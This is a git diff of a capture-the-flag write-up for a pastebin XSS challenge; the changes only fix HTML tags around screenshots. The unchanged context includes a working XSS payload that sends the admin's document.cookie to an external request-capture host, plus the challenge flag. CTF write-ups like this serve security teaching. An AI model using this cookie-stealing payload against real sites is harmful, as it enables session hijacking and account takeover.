@@ -7,7 +7,7 @@
 Notice that the website is vulnerable to XSS
 
 <p align="center">
-    <kbd><img src="images/pastebin-2.png" style="border: 0.8px solid black" caption="Challenge" /><kbd><br/>
+    <kbd><img src="images/pastebin-2.png" style="border: 0.8px solid black" caption="Challenge" /></kbd><br/>
 </p>
 
 <p align="center">
@@ -21,7 +21,7 @@ Exploit XSS vulnerability to obtain admin cookie
 `<script>new Image().src="https://enfai4qtftdcn.x.pipedream.net?c="+document.cookie;</script>`
 
 <p align="center">
-    <img src="images/pastebin-4.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
+    <kbd><img src="images/pastebin-4.png" style="border: 0.8px solid black" caption="Challenge" /></kbd><br/>
 </p>
 
 Use the admin page to access the vulnerable page.
@@ -33,7 +33,7 @@ Use the admin page to access the vulnerable page.
 Got the flag on requestbin
 
 <p align="center">
-    <img src="images/pastebin-6.png" style="border: 0.8px solid black" caption="Challenge" /><br/>
+    <kbd><img src="images/pastebin-6.png" style="border: 0.8px solid black" caption="Challenge" /></kbd><br/>
 </p>
 
 Flag: `flag{d1dn7_n33d_70_b3_1n_ru57}`
